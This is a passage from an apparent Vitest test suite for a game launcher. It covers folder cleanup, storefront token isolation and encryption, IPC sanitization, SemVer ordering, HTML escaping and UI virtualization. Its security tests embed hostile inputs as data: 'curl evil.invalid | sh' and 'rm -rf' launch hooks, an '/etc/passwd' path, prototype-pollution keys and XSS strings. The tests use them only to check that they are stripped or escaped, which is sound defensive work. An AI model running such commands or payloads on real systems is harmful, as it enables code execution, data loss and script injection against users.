        const fallbackFolders = winSecUtils.resolveHostWindowsKnownFolders();
        expect(fallbackFolders.documents).not.toContain('\uFFFD');
        expect(fallbackFolders.documents).toBe('C:\\Users\\player_josé\\Documents');
      } finally {
        homedirSpy.mockRestore();
        execSpy.mockRestore();
        if (origPlatformDesc) {
          Object.defineProperty(process, 'platform', origPlatformDesc);
        }
        if (origUserProfile !== undefined) process.env.USERPROFILE = origUserProfile;
        else delete process.env.USERPROFILE;
        delete requireCjs.cache[secModulePath];
      }

      // Verify purgeOsMetadataAndCountRealFilesSync on Known Folder roots (`.../Saved Games` & `.../OneDrive/Documents`)
      const tmpRoot = trackTempDir('known-folder-desktop-ini');
      const savedGamesRoot = path.join(tmpRoot, 'Users', 'player_one', 'Saved Games');
      const nestedSaveDir = path.join(savedGamesRoot, 'SyntheticRpg');
      fs.mkdirSync(nestedSaveDir, { recursive: true });

      const rootDesktopIni = path.join(savedGamesRoot, 'desktop.ini');
      const nestedDesktopIni = path.join(nestedSaveDir, 'desktop.ini');
      const nestedThumbsDb = path.join(nestedSaveDir, 'Thumbs.db');
      const realSaveFile = path.join(nestedSaveDir, 'profile.sav');

      fs.writeFileSync(rootDesktopIni, '[.ShellClassInfo]\r\nLocalizedResourceName=@shell32.dll\r\n');
      fs.writeFileSync(nestedDesktopIni, '[.ShellClassInfo]\r\n');
      fs.writeFileSync(nestedThumbsDb, 'junk');
      fs.writeFileSync(realSaveFile, 'SAVE_SLOT_DATA');

      const purgeRes = cloudSaveEngine.purgeOsMetadataAndCountRealFilesSync(savedGamesRoot);
      expect(purgeRes.exists).toBe(true);
      expect(purgeRes.realFileCount).toBe(1);
      expect(purgeRes.purgedCount).toBe(2);
      expect(fs.existsSync(rootDesktopIni)).toBe(true);
      expect(fs.existsSync(nestedDesktopIni)).toBe(false);
      expect(fs.existsSync(nestedThumbsDb)).toBe(false);
      expect(fs.existsSync(realSaveFile)).toBe(true);

      const oneDriveDocsRoot = path.join(tmpRoot, 'Users', 'player_one', 'OneDrive', 'Documents');
      fs.mkdirSync(oneDriveDocsRoot, { recursive: true });
      const oneDriveDesktopIni = path.join(oneDriveDocsRoot, 'desktop.ini');
      fs.writeFileSync(oneDriveDesktopIni, '[.ShellClassInfo]\r\n');
      const oneDrivePurgeRes = cloudSaveEngine.purgeOsMetadataAndCountRealFilesSync(oneDriveDocsRoot);
      expect(oneDrivePurgeRes.exists).toBe(true);
      expect(oneDrivePurgeRes.realFileCount).toBe(0);
      expect(fs.existsSync(oneDriveDesktopIni)).toBe(true);
    });

    it('isolates Heroic Epic refresh_token unless allowExternalTokenRefresh is true and skips native GOG Galaxy installs during auto-scan', async () => {
      const tmpHome = trackTempDir('heroic-gog-coexistence');
      const oneLauncherUserData = path.join(tmpHome, 'OneLauncherData');
      const heroicLegendaryDir = path.join(
        tmpHome,
        'Library/Application Support/heroic/legendaryConfig/legendary'
      );
      fs.mkdirSync(heroicLegendaryDir, { recursive: true });

      const heroicUserJsonPath = path.join(heroicLegendaryDir, 'user.json');
      const originalHeroicPayload = JSON.stringify(
        {
          access_token: 'eg1~expired_heroic_access_991122',
          refresh_token: 'eg1~heroic_single_use_refresh_334455',
          expires_at: new Date(Date.now() - 3600_000).toISOString(),
          account_id: 'a1b2c3d4e5f60718293a4b5c6d7e8f90',
          displayName: 'SyntheticPlayer',
        },
        null,
        2
      );
      fs.writeFileSync(heroicUserJsonPath, originalHeroicPayload, 'utf8');

      const renewSpy = vi.fn(async (rt: string) => ({
        access_token: `eg1~rotated_from_${rt.slice(-6)}`,
        refresh_token: 'eg1~rotated_isolated_refresh_778899',
        expires_in: 7200,
        expires_at: new Date(Date.now() + 7200_000).toISOString(),
      }));
      const mockStoreSync = {
        loadSavedTokens: () => ({}),
        saveTokens: vi.fn(),
        renewEpicTokens: renewSpy,
      };

      // 1. Default (allowExternalTokenRefresh omitted/false): MUST NOT rotate Heroic's single-use refresh_token
      await launcherEngine.ensureLegendaryConfigAndAuth({
        homedir: tmpHome,
        userDataDir: oneLauncherUserData,
        storeSync: mockStoreSync,
      });
      expect(renewSpy).not.toHaveBeenCalled();
      expect(fs.readFileSync(heroicUserJsonPath, 'utf8')).toBe(originalHeroicPayload);

      // 2. Opt-in (allowExternalTokenRefresh: true): renews and writes ONLY to One Launcher's isolated user.json
      const authRes = await launcherEngine.ensureLegendaryConfigAndAuth({
        homedir: tmpHome,
        userDataDir: oneLauncherUserData,
        allowExternalTokenRefresh: true,
        storeSync: mockStoreSync,
      });
      expect(renewSpy).toHaveBeenCalledTimes(1);
      expect(fs.readFileSync(heroicUserJsonPath, 'utf8')).toBe(originalHeroicPayload);

      const isolatedUserJson = path.join(
        oneLauncherUserData,
        'legendaryConfig',
        'legendary',
        'user.json'
      );
      expect(authRes.userFilePath).toBe(isolatedUserJson);
      expect(fs.existsSync(isolatedUserJson)).toBe(true);
      expect(JSON.parse(fs.readFileSync(isolatedUserJson, 'utf8')).access_token).toBe(
        'eg1~rotated_from_334455'
      );

      // 3. Native GOG Galaxy install (runner === 'gog_galaxy') skipped during auto-scan
      const galaxyGameDir = path.join(tmpHome, 'GOG Games', 'Synthetic Punk');
      fs.mkdirSync(galaxyGameDir, { recursive: true });
      const gogSyncRes = launcherEngine.syncGogFirstPartyLauncher(
        {
          platformId: 'gog',
          platformGameId: '1454315831',
          runner: 'gog_galaxy',
          installPath: galaxyGameDir,
        },
        {
          platform: 'win32',
          homedir: tmpHome,
          fromAutoScan: true,
        }
      );
      expect(gogSyncRes).toEqual({
        synced: false,
        skippedNativeGalaxyInstall: true,
      });
    });
  });

  // ============================================================================
  // 3. Security Boundaries, SemVer, Vault Encryption & Contract Parity
  // ============================================================================
  describe('3. Security Boundaries, SemVer, Vault Encryption & Contract Parity', () => {
    it('strips forbidden renderer IPC injection keys, enforces dialog.showMessageBox approval on shell commands, and strips unapproved inline commands on launch', async () => {
      const hostilePayload = JSON.parse(
        '{"gameId":"g-1","title":"Safe","__proto__":{"polluted":true},"constructor":{"bad":1}}'
      );
      Object.assign(hostilePayload, {
        execFileSync: () => 'pwn',
        execFileSyncFn: () => 'pwn',
        spawnFn: () => 'pwn',
        gameSpawnFn: () => 'pwn',
        tokensFilePath: '/etc/passwd',
        userDataDir: '/tmp/hijack',
        homedir: '/tmp/hijack-home',
        allowExternalTokenRefresh: true,
        allowCodesignInTest: true,
        nestedCallback: () => {},
        launchConfig: {
          launchArgs: '-windowed',
        },
      });

      const clean = launcherIpcHandlers.sanitizeRendererIpcOptions(hostilePayload);
      expect(clean.gameId).toBe('g-1');
      expect(clean.title).toBe('Safe');
      expect(clean.launchConfig).toEqual({ launchArgs: '-windowed' });
      expect(clean.execFileSync).toBeUndefined();
      expect(clean.execFileSyncFn).toBeUndefined();
      expect(clean.spawnFn).toBeUndefined();
      expect(clean.gameSpawnFn).toBeUndefined();
      expect(clean.tokensFilePath).toBeUndefined();
      expect(clean.userDataDir).toBeUndefined();
      expect(clean.homedir).toBeUndefined();
      expect(clean.allowExternalTokenRefresh).toBeUndefined();
      expect(clean.allowCodesignInTest).toBeUndefined();
      expect(clean.nestedCallback).toBeUndefined();
      expect(({} as Record<string, unknown>).polluted).toBeUndefined();

      // Register IPC handlers with mocked ipcMain + dialog + launcherEngine
      const handlers = new Map<string, (...args: any[]) => Promise<any>>();
      const savedConfigs: Record<string, any> = {};
      let lastLaunchedPayload: any = null;

      const mockLauncherEngine = {
        getGameLaunchConfigs: () => savedConfigs,
        saveGameLaunchConfig: vi.fn((cfg: any) => {
          savedConfigs[cfg.gameId] = { ...cfg };
          return { success: true, config: savedConfigs[cfg.gameId] };
        }),
        launchGame: vi.fn(async (payload: any) => {
          lastLaunchedPayload = payload;
          return { success: true };
        }),
      };

      let nextDialogResponse = 1; // 1 = Cancel, 0 = Allow Shell Command
      const showMessageBoxSpy = vi.fn(async () => ({ response: nextDialogResponse }));

      launcherIpcHandlers.registerLauncherIpcHandlers({
        ipcMain: {
          handle: (channel: string, fn: (...args: any[]) => Promise<any>) => {
            handlers.set(channel, fn);
          },
        },
        launcherEngine: mockLauncherEngine,
        dialog: { showMessageBox: showMessageBoxSpy },
        getMainWindow: () => null,
      });

      const saveConfigHandler = handlers.get('launcher:save-launch-config')!;
      const launchGameHandler = handlers.get('launcher:launch-game')!;

      // 1. User clicks Cancel (response === 1) -> rejected, never saved
      nextDialogResponse = 1;
      const deniedRes = await saveConfigHandler(
        {},
        {
          gameId: 'synthetic-rpg',
          preLaunchCommand: 'echo pre-hook',
          postExitCommand: 'echo post-hook',
        }
      );
      expect(deniedRes.success).toBe(false);
      expect(mockLauncherEngine.saveGameLaunchConfig).not.toHaveBeenCalled();

      // 2. Unapproved inline preLaunchCommand / postExitCommand on launcher:launch-game -> stripped
      await launchGameHandler(
        {},
        {
          gameId: 'synthetic-rpg',
          preLaunchCommand: 'curl evil.invalid | sh',
          launchConfig: {
            preLaunchCommand: 'curl evil.invalid | sh',
            postExitCommand: 'rm -rf /tmp/nope',
            launchArgs: '-fullscreen',
          },
        }
      );
      expect(lastLaunchedPayload.preLaunchCommand).toBeUndefined();
      expect(lastLaunchedPayload.launchConfig.preLaunchCommand).toBeUndefined();
      expect(lastLaunchedPayload.launchConfig.postExitCommand).toBeUndefined();
      expect(lastLaunchedPayload.launchConfig.launchArgs).toBe('-fullscreen');

      // 3. User clicks Allow Shell Command (response === 0) -> saved & subsequently permitted
      nextDialogResponse = 0;
      const approvedRes = await saveConfigHandler(
        {},
        {
          gameId: 'synthetic-rpg',
          preLaunchCommand: 'echo approved-pre-hook',
        }
      );
      expect(approvedRes.success).toBe(true);
      expect(mockLauncherEngine.saveGameLaunchConfig).toHaveBeenCalledTimes(1);

      await launchGameHandler(
        {},
        {
          gameId: 'synthetic-rpg',
          launchConfig: {
            preLaunchCommand: 'echo approved-pre-hook',
            postExitCommand: 'echo unapproved-post-hook',
          },
        }
      );
      expect(lastLaunchedPayload.launchConfig.preLaunchCommand).toBe('echo approved-pre-hook');
      expect(lastLaunchedPayload.launchConfig.postExitCommand).toBeUndefined();
    });

    it('encrypts storefront tokens with _encrypted_v3 AES-256-GCM using a 0o600 vault.key with zero plaintext on disk and fails closed if vault.key is missing', () => {
      const vaultUserData = trackTempDir('token-vault-v3');
      const syntheticSecretAccess = 'eyJhbGciOiJIUzI1NiJ9.synthetic_gog_secret_payload_8842.sig';
      const syntheticEpicRefresh = 'eg1~synthetic_epic_refresh_secret_7731';

      tokenVault.saveTokens(
        'gog',
        {
          access_token: syntheticSecretAccess,
          refresh_token: 'gog_oauth_refresh_9921',
          user_id: '4499110022',
        },
        { userDataDir: vaultUserData }
      );
      tokenVault.saveTokens(
        'epic',
        {
          access_token: 'eg1~synthetic_epic_access_5519',
          refresh_token: syntheticEpicRefresh,
          account_id: 'a0b1c2d3e4f5061728394a5b6c7d8e9f',
        },
        { userDataDir: vaultUserData }
      );

      const vaultKeyPath = path.join(vaultUserData, 'vault.key');
      const tokensFilePath = path.join(vaultUserData, 'tokens.json');
      expect(fs.existsSync(vaultKeyPath)).toBe(true);
      expect(fs.existsSync(tokensFilePath)).toBe(true);

      if (process.platform !== 'win32') {
        const keyMode = fs.statSync(vaultKeyPath).mode & 0o777;
        expect(keyMode).toBe(0o600);
        const tokensMode = fs.statSync(tokensFilePath).mode & 0o777;
        expect(tokensMode).toBe(0o600);
      }

      const rawDiskText = fs.readFileSync(tokensFilePath, 'utf8');
      expect(rawDiskText).not.toContain(syntheticSecretAccess);
      expect(rawDiskText).not.toContain(syntheticEpicRefresh);

      const parsedDiskEnvelope = JSON.parse(rawDiskText);
      expect(parsedDiskEnvelope._encrypted_v3).toBe(true);
      expect(parsedDiskEnvelope.alg).toBe('aes-256-gcm');

      const loaded = tokenVault.loadSavedTokens({ userDataDir: vaultUserData });
      expect(loaded.gog.access_token).toBe(syntheticSecretAccess);
      expect(loaded.epic.refresh_token).toBe(syntheticEpicRefresh);

      // Delete vault.key -> a fresh random key is generated so ciphertext fails GCM auth tag verification cleanly
      fs.unlinkSync(vaultKeyPath);
      const afterKeyLoss = tokenVault.loadSavedTokens({ userDataDir: vaultUserData });
      expect(afterKeyLoss).toEqual({});
    });

    it('enforces SemVer 2.0.0 pre-release ordering, escapes Epic system requirement HTML entities, and verifies 100% Cartesian parity between TS & CJS launchPolicyResolver', async () => {
      // 1. SemVer 2.0.0 pre-release precedence
      expect(semverUtils.compareSemver('0.2.0-beta.1', '0.2.0')).toBe(-1);
      expect(semverUtils.compareSemver('0.2.0', '0.2.0-beta.1')).toBe(1);
      expect(semverUtils.compareSemver('1.0.0-alpha.2', '1.0.0-alpha.1')).toBe(1);
      expect(semverUtils.compareSemver('1.0.0-alpha.10', '1.0.0-alpha.2')).toBe(1);
      expect(semverUtils.compareSemver('1.0.0+20261024', '1.0.0+20260101')).toBe(0);

      // 2. Epic system requirement HTML escaping (unit + end-to-end fetchEpicProductOfferMetadata)
      const escapedSample = storeSync.escapeHtmlEntities(
        'Win 10 <img src=x onerror="alert(\'xss\')">&DX12'
      );
      expect(escapedSample).toBe(
        'Win 10 &lt;img src=x onerror=&quot;alert(&#39;xss&#39;)&quot;&gt;&amp;DX12'
      );

      storeSync.epicOfferMetadataCache.clear();
      const origFetch = globalThis.fetch;
      globalThis.fetch = (async (input: RequestInfo | URL) => {
        const url = String(input);
        if (url.includes('/oauth/token')) {
          return {
            ok: true,
            status: 200,
            json: async () => ({
              access_token: 'eg1~catalog_client_token_synthetic',
              expires_in: 3600,
            }),
          } as Response;
        }
        if (url.includes('/offers')) {
          return {
            ok: true,
            status: 200,
            json: async () => ({
              elements: [
                {
                  id: 'offer-xss-audit',
                  title: 'Synthetic Citadel',
                  offerType: 'BASE_GAME',
                  urlSlug: 'synthetic-citadel',
                  description: 'Clean summary description for citadel.',
                },
              ],
            }),
          } as Response;
        }
        if (url.includes('store-content.ak.epicgames.com')) {
          return {
            ok: true,
            status: 200,
            json: async () => ({
              pages: [
                {
                  _slug: 'home',
                  data: {
                    requirements: {
                      systems: [
                        {
                          systemType: 'Windows',
                          details: [
                            {
                              title: 'OS <script>evil()</script>',
                              minimum: 'Windows 10 & <img src=x onerror=alert("min")>',
                              recommended: "Windows 11 <svg onload=alert('rec')>",
                            },
                          ],
                        },
                      ],
                    },
                  },
                },
              ],
            }),
          } as Response;
        }
        return { ok: false, status: 404, json: async () => ({}) } as Response;
      }) as typeof fetch;

      try {
        const meta = await storeSync.fetchEpicProductOfferMetadata({
          namespace: 'ns-xss-audit-01',
          catalogItemId: 'cat-xss-audit-01',
          title: 'Synthetic Citadel',
          slug: 'synthetic-citadel',
        });
        expect(meta).toBeTruthy();
        expect(meta.systemRequirements?.minimum).toContain('&lt;script&gt;evil()&lt;/script&gt;');
        expect(meta.systemRequirements?.minimum).toContain('&lt;img src=x onerror=alert(&quot;min&quot;)&gt;');
        expect(meta.systemRequirements?.minimum).not.toContain('<script>');
        expect(meta.systemRequirements?.minimum).not.toContain('<img');
        expect(meta.systemRequirements?.recommended).toContain(
          '&lt;svg onload=alert(&#39;rec&#39;)&gt;'
        );
        expect(meta.systemRequirements?.recommended).not.toContain('<svg');
      } finally {
        globalThis.fetch = origFetch;
        storeSync.epicOfferMetadataCache.clear();
      }

      // 3. Exhaustive Cartesian product parity: TS vs CJS resolveEffectiveLaunchPolicy
      const platformIds: StorefrontId[] = ['steam', 'gog', 'epic', 'custom'];
      const hostPlatforms: Array<'darwin' | 'win32' | 'linux'> = ['darwin', 'win32', 'linux'];
      const buildTypes: LaunchPolicyBuildType[] = [
        'mac_native_app',
        'mac_native_bin',
        'windows_exe_on_mac',
        'windows_native',
        'not_installed',
      ];
      const launchMethods: Array<LaunchMethod | undefined> = [
        undefined,
        'auto',
        'direct',
        'storefront_uri',
        'compatibility_layer',
      ];
      const lifecycles: Array<StorefrontClientLifecyclePolicy | 'default' | undefined> = [
        undefined,
        'default',
        'minimal_and_close_if_started',
        'minimal_keep_running',
        'default_client',
        'fast_direct_bypass',
      ];

      let checkedCombinations = 0;
      for (const platformId of platformIds) {
        for (const hostPlatform of hostPlatforms) {
          for (const detectedBuildType of buildTypes) {
            for (const configuredLaunchMethod of launchMethods) {
              for (const storefrontClientLifecycle of lifecycles) {
                for (const hasCustomExecutable of [false, true]) {
                  const input = {
                    platformId,
                    hostPlatform,
                    detectedBuildType,
                    isInstalled: detectedBuildType !== 'not_installed',
                    hasExecutable: detectedBuildType !== 'not_installed',
                    hasCustomExecutable,
                    configuredLaunchMethod,
                    storefrontClientLifecycle,
                  };
                  const tsPolicy = resolveTsLaunchPolicy(input);
                  const cjsPolicy = cjsLaunchPolicyResolver.resolveEffectiveLaunchPolicy(input);
                  expect(tsPolicy).toEqual(cjsPolicy);
                  checkedCombinations += 1;
                }
              }
            }
          }
        }
      }
      expect(checkedCombinations).toBe(3600);
    });
  });

  // ============================================================================
  // 4. Frontend Performance, IndexedDB, Virtualization & Native <dialog> Accessibility
  // ============================================================================
  describe('4. Frontend Performance, IndexedDB, Virtualization & Native <dialog> Accessibility', () => {
    it('merges 2,000 + 2,000 synthetic games in < 300ms, detects mid-catalog playtime mutations via computeCatalogGamesFingerprint, and round-trips indexedDbVault', async () => {
      const makeSyntheticGame = (
        idx: number,
        platformId: 'steam' | 'gog',
        titleIndex: number
      ): CanonicalGame => ({
        id: `${platformId}-syn-${idx}`,
        title: `Synthetic Odyssey Volume ${titleIndex}`,
        sortTitle: `synthetic odyssey volume ${String(titleIndex).padStart(5, '0')}`,
        steamAppId: platformId === 'steam' ? 500_000 + titleIndex : undefined,
        headerImage: '',
        developers: ['Synthetic Studio'],
        publishers: ['Synthetic Publishing'],
        genres: ['RPG'],
        tags: ['Singleplayer'],
        platforms: [
          {
            platformId,
            platformGameId: `${platformId}-id-${titleIndex}`,
            installed: idx % 4 === 0,
            playtimeMinutes: 10 + (idx % 120),
          },
        ],
      });

      // 2,000 Steam games (titles 0..1999) + 2,000 GOG games (titles 1000..2999 -> 1,000 overlaps + 1,000 net-new)
      const steamCatalog = Array.from({ length: 2000 }, (_, i) =>
        makeSyntheticGame(i, 'steam', i)
      );
      const gogIncoming = Array.from({ length: 2000 }, (_, i) =>
        makeSyntheticGame(i, 'gog', i + 1000)
      );

      const t0 = performance.now();
      const merged = mergeStorefrontGames(steamCatalog, gogIncoming, 'gog');
      const elapsedMs = performance.now() - t0;

      expect(merged).toHaveLength(3000);
      expect(elapsedMs).toBeLessThan(300);

      // Verify cross-storefront deduplication merged platforms on overlapping title 1000
      const overlappedEntry = merged.find((g) => g.title === 'Synthetic Odyssey Volume 1000');
      expect(overlappedEntry).toBeDefined();
      expect(overlappedEntry!.platforms.map((p) => p.platformId).sort()).toEqual(['gog', 'steam']);

      // Verify O(N) dual-FNV1a fingerprint catches +5 playtime mutation at middle index 1000
      const fpBefore = computeCatalogGamesFingerprint(merged);
      const mutated = merged.slice();
      mutated[1000] = {
        ...mutated[1000],
        platforms: mutated[1000].platforms.map((p, idx) =>
          idx === 0 ? { ...p, playtimeMinutes: (p.playtimeMinutes ?? 0) + 5 } : p
        ),
      };
      const fpAfter = computeCatalogGamesFingerprint(mutated);
      expect(fpAfter).not.toBe(fpBefore);

      // Spec-compliant in-memory IDBFactory to verify real idb-keyval + indexedDbVault round-trip
      const origIndexedDb = (globalThis as any).indexedDB;
      const storesByDb = new Map<string, Map<string, Map<string, unknown>>>();

      const mockIndexedDb = {
        open(dbName: string) {
          const req: Record<string, any> = {
            result: null,
            error: null,
            onupgradeneeded: null,
            onsuccess: null,
            onerror: null,
          };
          queueMicrotask(() => {
            let dbMap = storesByDb.get(dbName);
            const isNew = !dbMap;
            if (!dbMap) {
              dbMap = new Map();
              storesByDb.set(dbName, dbMap);
            }
            const dbObj = {
              onclose: null as (() => void) | null,
              createObjectStore(storeName: string) {
                if (!dbMap!.has(storeName)) {
                  dbMap!.set(storeName, new Map());
                }
                return {};
              },
              transaction(storeName: string) {
                const kv = dbMap!.get(storeName) ?? new Map<string, unknown>();
                dbMap!.set(storeName, kv);
                const tx: Record<string, any> = {
                  oncomplete: null,
                  onerror: null,
                  onabort: null,
                  objectStore() {
                    return {
                      transaction: tx,
                      get(key: string) {
                        const getReq: Record<string, any> = { result: undefined, onsuccess: null };
                        queueMicrotask(() => {
                          getReq.result = kv.get(key);
                          getReq.onsuccess?.();
                          tx.oncomplete?.();
                        });
                        return getReq;
                      },
                      put(val: unknown, key: string) {
                        kv.set(key, structuredClone(val));
                        queueMicrotask(() => tx.oncomplete?.());
                      },
                      delete(key: string) {
                        kv.delete(key);
                        queueMicrotask(() => tx.oncomplete?.());
                      },
                    };
                  },
                };
                return tx;
              },
            };
            req.result = dbObj;
            if (isNew && typeof req.onupgradeneeded === 'function') {
              req.onupgradeneeded();
            }
            req.onsuccess?.();
          });
          return req;
        },
      };

      (globalThis as any).indexedDB = mockIndexedDb;
      try {
        expect(isIndexedDbAvailable()).toBe(true);
        const vaultPayload = {
          version: 3,
          catalogCount: merged.length,
          sampleTitle: merged[0].title,
        };
        const wrote = await vaultSet('audit-roundtrip-key', vaultPayload);
        expect(wrote).toBe(true);

        const readBack = await vaultGet<typeof vaultPayload>('audit-roundtrip-key');
        expect(readBack).toEqual(vaultPayload);

        const deleted = await vaultDelete('audit-roundtrip-key');
        expect(deleted).toBe(true);
        expect(await vaultGet('audit-roundtrip-key')).toBeUndefined();
      } finally {
        (globalThis as any).indexedDB = origIndexedDb;
      }
    });

    it('canonicalizes OpenCritic, Metacritic, and Steam Store rate-limiter hostnames in extractDomain', () => {
      expect(extractDomain('https://api.opencritic.com/api/game/search?criteria=hades')).toBe(
        'api.opencritic.com'
      );
      expect(extractDomain('https://www.metacritic.com/game/hades/')).toBe('metacritic.com');
      expect(extractDomain('https://store.steampowered.com/api/appdetails?appids=1145360')).toBe(
        'store.steampowered.com'
      );
    });

    it('renders ModalShell as native <dialog closedby="any">, invokes showModal(), handles coordinate backdrop fallback when closedBy is absent, and avoids #root inert mutation on inline render', () => {
      const origDocument = (globalThis as any).document;
      const origHtmlDialog = (globalThis as any).HTMLDialogElement;

      const rootAttrs = new Map<string, string>();
      const mockRootEl = {
        setAttribute: (k: string, v: string) => rootAttrs.set(k, v),
        getAttribute: (k: string) => (rootAttrs.has(k) ? rootAttrs.get(k)! : null),
        removeAttribute: (k: string) => rootAttrs.delete(k),
      };

      const dialogListeners = new Map<string, Set<(...args: any[]) => void>>();
      const showModalSpy = vi.fn(function (this: any) {
        this.open = true;
      });
      const closeDialogSpy = vi.fn(function (this: any) {
        this.open = false;
        const handlers = dialogListeners.get('close');
        handlers?.forEach((fn) => fn());
      });

      const mockDialogElement: Record<string, any> = {
        open: false,
        showModal: showModalSpy,
        close: closeDialogSpy,
        setAttribute: vi.fn(),
        removeAttribute: vi.fn(),
        addEventListener: (ev: string, fn: (...args: any[]) => void) => {
          if (!dialogListeners.has(ev)) dialogListeners.set(ev, new Set());
          dialogListeners.get(ev)!.add(fn);
        },
        removeEventListener: (ev: string, fn: (...args: any[]) => void) => {
          dialogListeners.get(ev)?.delete(fn);
        },
        getBoundingClientRect: () => ({
          left: 200,
          top: 150,
          width: 600,
          height: 400,
          right: 800,
          bottom: 550,
        }),
      };

      // Simulate browser without HTMLDialogElement.prototype.closedBy first
      class MockDialogWithoutClosedBy {}
      (globalThis as any).HTMLDialogElement = MockDialogWithoutClosedBy;
      (globalThis as any).document = {
        documentElement: {
          setAttribute: vi.fn(),
          removeAttribute: vi.fn(),
        },
        body: {}, // plain object -> inline render (canPortalModalToBody() === false)
        getElementById: (id: string) => (id === 'root' ? mockRootEl : null),
      };

      const refs: Array<{ current: any }> = [];
      const cleanups: Array<(() => void) | undefined> = [];
      const internals = (React as any)
        .__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;

      const mountModal = (props: React.ComponentProps<typeof ModalShell>) => {
        let refIdx = 0;
        const pendingEffects: Array<() => any> = [];
        const prevH = internals.H;
        internals.H = {
          useRef(initial: any) {
            const idx = refIdx++;
            if (idx >= refs.length) {
              // Seed dialogRef (index 0) with our mocked <dialog> element
              refs.push({ current: idx === 0 ? mockDialogElement : initial });
            }
            return refs[idx];
          },
          useEffect(fn: () => any) {
            pendingEffects.push(fn);
          },
        };
        let tree: any;
        try {
          tree = ModalShell(props);
        } finally {
          internals.H = prevH;
        }
        while (cleanups.length > 0) {
          const c = cleanups.pop();
          c?.();
        }
        for (const eff of pendingEffects) {
          const cleanup = eff();
          if (typeof cleanup === 'function') cleanups.push(cleanup);
        }
        return tree;
      };

      try {
        const onCloseSpy = vi.fn();
        const tree = mountModal({
          isOpen: true,
          onClose: onCloseSpy,
          ariaLabel: 'Synthetic Settings Dialog',
          testId: 'audit-modal-shell',
          children: React.createElement('div', null, 'Modal Body'),
        });

        expect(tree.type).toBe('dialog');
        expect(tree.props.closedby).toBe('any');
        expect(showModalSpy).toHaveBeenCalledTimes(1);
        expect(mockDialogElement.open).toBe(true);
        // #root was NEVER marked inert!
        expect(mockRootEl.getAttribute('inert')).toBeNull();

        // Click INSIDE dialog bounding box (200..800, 150..550) -> stays open
        tree.props.onClick({
          target: mockDialogElement,
          clientX: 400,
          clientY: 300,
        });
        expect(onCloseSpy).not.toHaveBeenCalled();

        // Click OUTSIDE dialog bounding box when closedBy is absent -> fallback closes modal!
        tree.props.onClick({
          target: mockDialogElement,
          clientX: 40,
          clientY: 40,
        });
        expect(closeDialogSpy).toHaveBeenCalledTimes(1);
        expect(onCloseSpy).toHaveBeenCalledTimes(1);

        // When HTMLDialogElement.prototype.closedBy IS supported, JS click handler defers to native light-dismiss
        mockDialogElement.open = true;
        class MockDialogWithClosedBy {}
        (MockDialogWithClosedBy.prototype as any).closedBy = 'any';
        (globalThis as any).HTMLDialogElement = MockDialogWithClosedBy;

        tree.props.onClick({
          target: mockDialogElement,
          clientX: 20,
          clientY: 20,
        });
        expect(onCloseSpy).toHaveBeenCalledTimes(1);

        while (cleanups.length > 0) {
          cleanups.pop()?.();
        }
        expect(mockRootEl.getAttribute('inert')).toBeNull();
      } finally {
        (globalThis as any).document = origDocument;
        (globalThis as any).HTMLDialogElement = origHtmlDialog;
      }
    });

    it('renders fewer than 60 card nodes for a 1,000-item catalog in VirtualGridRows inside an 800px scroll viewport', () => {
      const origDocument = (globalThis as any).document;
      if (typeof origDocument === 'undefined') {
        (globalThis as any).document = {};
      }

      const mockScrollEl = {
        clientWidth: 1280,
        clientHeight: 800,
        scrollTop: 0,
        scrollLeft: 0,
        offsetTop: 0,
        offsetParent: null,
        ownerDocument: {
          defaultView: {
            requestAnimationFrame: (cb: FrameRequestCallback) =>
              setTimeout(() => cb(0), 0) as unknown as number,
            cancelAnimationFrame: (id: number) => clearTimeout(id),
            setTimeout,
            clearTimeout,
          },
        },
        getBoundingClientRect: () => ({
          top: 0,
          left: 0,
          width: 1280,
          height: 800,
          bottom: 800,
          right: 1280,
          x: 0,
          y: 0,
          toJSON: () => ({}),
        }),
        addEventListener: () => {},
        removeEventListener: () => {},
      } as unknown as HTMLElement;

      const items = Array.from({ length: 1000 }, (_, i) => ({
        id: `card-${i}`,
        title: `Synthetic Card ${i}`,
      }));

      const states: any[] = [];
      const refs: Array<{ current: any }> = [];
      const cleanups: Array<(() => void) | undefined> = [];
      const prevDeps: Array<any[] | undefined> = [];
      const internals = (React as any)
        .__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;

      const renderVirtualGrid = () => {
        let stateIdx = 0;
        let refIdx = 0;
        let effectIdx = 0;
        const pendingEffects: Array<{ idx: number; fn: () => any }> = [];
        const prevH = internals.H;

        const recordEffect = (fn: () => any, deps?: any[]) => {
          const idx = effectIdx++;
          const old = prevDeps[idx];
          const changed =
            !old || !deps || old.length !== deps.length || deps.some((d, i) => !Object.is(d, old[i]));
          if (changed) {
            prevDeps[idx] = deps;
            pendingEffects.push({ idx, fn });
          }
        };

        internals.H = {
          useState(initial: any) {
            const idx = stateIdx++;
            if (idx >= states.length) {
              states.push(typeof initial === 'function' ? initial() : initial);
            }
            return [
              states[idx],
              (u: any) => {
                states[idx] = typeof u === 'function' ? u(states[idx]) : u;
              },
            ];
          },
          useReducer(reducer: (s: any, a: any) => any, initArg: any, init?: (a: any) => any) {
            const idx = stateIdx++;
            if (idx >= states.length) {
              states.push(typeof init === 'function' ? init(initArg) : initArg);
            }
            return [
              states[idx],
              (action: any) => {
                states[idx] = reducer(states[idx], action);
              },
            ];
          },
          useRef(initial: any) {
            const idx = refIdx++;
            if (idx >= refs.length) {
              refs.push({ current: initial });
            }
            return refs[idx];
          },
          useEffect: recordEffect,
          useLayoutEffect: recordEffect,
          useMemo: (fn: () => any) => fn(),
          useCallback: (fn: any) => fn,
        };

        let tree: any;
        try {
          tree = VirtualGridRows({
            items,
            scrollElement: mockScrollEl,
            columnCount: 5,
            estimatedRowHeight: 280,
            overscan: 3,
            rowClassName: 'grid grid-cols-5 gap-4',
            renderCard: (item, absIdx) =>
              React.createElement(
                'article',
                { key: item.id, 'data-card-index': absIdx },
                item.title
              ),
          });
        } finally {
          internals.H = prevH;
        }

        for (const eff of pendingEffects) {
          cleanups[eff.idx]?.();
          const c = eff.fn();
          cleanups[eff.idx] = typeof c === 'function' ? c : undefined;
        }
        return tree;
      };

      try {
        // First render mounts Virtualizer & runs _didMount() to measure the 800px viewport;
        // second render emits the measured virtualized rows.
        renderVirtualGrid();
        const tree = renderVirtualGrid();

        const collectCards = (node: any, out: any[] = []): any[] => {
          if (!node || typeof node !== 'object') return out;
          if (Array.isArray(node)) {
            node.forEach((child) => collectCards(child, out));
            return out;
          }
          if (node.type === 'article' && node.props?.['data-card-index'] !== undefined) {
